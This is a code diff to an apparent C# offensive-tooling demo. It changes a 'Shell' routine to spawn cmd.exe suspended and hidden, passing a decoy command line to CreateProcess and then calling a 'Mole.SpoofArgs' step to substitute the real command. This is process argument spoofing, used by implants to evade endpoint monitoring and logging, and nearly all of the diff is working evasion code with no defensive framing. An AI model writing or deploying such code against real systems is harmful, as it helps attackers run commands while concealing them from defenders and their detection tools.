@@ -1,4 +1,5 @@
-﻿using DemoApp.Injection;
+﻿using DemoApp.Deception;
+using DemoApp.Injection;
 
 using Microsoft.Win32.SafeHandles;
 
@@ -53,9 +54,14 @@ namespace DemoApp.Sacrificial
 
         public string Shell(string Command)
         {
-            this.Command = $"cmd.exe /c {Command}";
+            this.SpawnTo = @"C:\Windows\System32\cmd.exe";
+            this.Command = $"/c {Command}";
 
             var pi = Sacrifice(out IntPtr readPipe);
+
+            var mole = new Mole(pi, this.Command);
+            mole.SpoofArgs();
+
             return ReadFromPipe(pi, readPipe);
         }
 
@@ -188,11 +194,11 @@ namespace DemoApp.Sacrificial
 
                 CreateProcess(
                     SpawnTo,
-                    Command,
+                    "this is a load of bollocks", //Command,
                     ref ps,
                     ref ts,
                     true,
-                    EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW,
+                    EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW | CREATE_SUSPENDED,
                     IntPtr.Zero,
                     null,
                     ref siEx,
